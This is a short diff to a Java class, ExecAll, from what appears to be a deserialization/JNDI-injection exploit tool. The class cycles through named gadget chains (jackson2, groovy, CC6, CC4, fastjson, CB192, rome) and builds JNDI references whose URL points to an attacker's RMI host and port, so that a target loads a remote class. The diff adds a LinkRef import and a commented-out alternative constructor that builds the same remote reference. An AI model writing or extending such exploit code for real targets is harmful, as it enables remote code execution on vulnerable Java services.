@@ -6,6 +6,7 @@ import org.c3p0ooo.ArgsBean;
 import org.gadget.inter.Gadget;
 import sun.rmi.server.UnicastServerRef;
 
+import javax.naming.LinkRef;
 import javax.naming.StringRefAddr;
 import java.lang.reflect.Field;
 import java.rmi.server.RemoteObject;
@@ -14,6 +15,7 @@ import java.util.HashMap;
 public class ExecAll implements Gadget {
 
     private ResourceRef ref;
+//    private LinkRef linkRef;
     private String[] gname = {"jackson2","groovy","CC6","CC4","fastjson","CB192","rome"};
     private HashMap map = new ArgsBean().getMap();
 
@@ -26,6 +28,16 @@ public class ExecAll implements Gadget {
             ref.add(new StringRefAddr("URL","rmi://"+ip+":"+port+"/"+className));
         }
     }
+
+//    public ExecAll(String ip, int port){
+//        String className = "";
+//        this.linkRef = new LinkRef("com.sun.jndi.rmi.registry.RegistryContextFactory");
+//        for(String name : gname){
+//            className = (String)map.get(name);
+//            //必须是RUL，url必须为"rmi:"开头
+//            linkRef.add(new StringRefAddr("URL","rmi://"+ip+":"+port+"/"+className));
+//        }
+//    }
     @Override
     public Object getObject(String command) throws Exception {
 
